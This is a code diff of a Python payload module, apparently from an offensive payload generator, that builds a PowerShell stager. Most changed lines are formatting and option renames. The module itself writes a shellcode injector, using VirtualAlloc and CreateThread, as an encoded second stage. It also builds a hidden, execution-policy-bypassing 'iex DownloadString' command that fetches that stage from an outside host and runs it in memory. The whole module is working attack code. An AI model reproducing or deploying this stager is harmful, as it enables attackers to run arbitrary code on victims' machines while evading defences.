@@ -3,7 +3,7 @@
 Powershell method that builds a simple stager that downloads a secondary
 encrypted powershell command from a web host and executes that in memory.
 
-The secondary command is a powershell encrypted inline shellcode injector. 
+The secondary command is a powershell encrypted inline shellcode injector.
 
 Original concept from  http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html
 
@@ -20,24 +20,26 @@ import settings
 
 
 class Payload:
-    
+
     def __init__(self):
         self.description = "Powershell method that downloads a secondary powershell command from a webserver"
         self.rating = "Excellent"
         self.language = "powershell"
         self.extension = "txt"
-        
+
         self.shellcode = shellcode.Shellcode()
-        # format is {Option : [Value, Description]]}
-        self.required_options = {"DownloadHost" : ["", "The host to download the secondary stage from"],
-                        "DownloadPort" : ["80", "The port on the host to download from"]}
+        # format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "DOWNLOAD_HOST" : ["", "The host to download the secondary stage from"],
+                                    "DOWNLOAD_PORT" : ["80", "The port on the host to download from"]
+                                }
         self.notes = ""
-        
+
     def generate(self):
 
         Shellcode = self.shellcode.generate()
         Shellcode = ",0".join(Shellcode.split("\\"))[1:]
-        
+
         baseString = """$c = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
@@ -56,29 +58,29 @@ $z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
         powershell_command = base64.b64encode(powershell_command)
 
         payloadName = helpers.randomString()
-        
+
         # write base64 payload out to disk
         settings.PAYLOAD_SOURCE_PATH
         secondStageName = settings.PAYLOAD_SOURCE_PATH + payloadName
         f = open( secondStageName , 'w')
         f.write("powershell -Enc %s\n" %(powershell_command))
         f.close()
-        
-        
+
+
         # give notes to the user
         self.notes = "\n\tsecondary payload written to " + secondStageName + " ,"
-        self.notes += " serve this on http://%s:%s\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0],)
-        
-        
+        self.notes += " serve this on http://%s:%s\n" %(self.required_options["DOWNLOAD_HOST"][0], self.required_options["DOWNLOAD_PORT"][0],)
+
+
         # build our downloader shell
-        downloaderCommand = "iex (New-Object Net.WebClient).DownloadString(\"http://%s:%s/%s\")\n" %(self.required_options["DownloadHost"][0], self.required_options["DownloadPort"][0], payloadName)
+        downloaderCommand = "iex (New-Object Net.WebClient).DownloadString(\"http://%s:%s/%s\")\n" %(self.required_options["DOWNLOAD_HOST"][0], self.required_options["DOWNLOAD_PORT"][0], payloadName)
         powershell_command = unicode(downloaderCommand)
         blank_command = ""
         for char in powershell_command:
             blank_command += char + "\x00"
         powershell_command = blank_command
         powershell_command = base64.b64encode(powershell_command)
-        
+
         downloaderCode = "x86 powershell command:\n"
         downloaderCode += "\tpowershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + powershell_command
         downloaderCode += "\n\nx64 powershell command:\n"
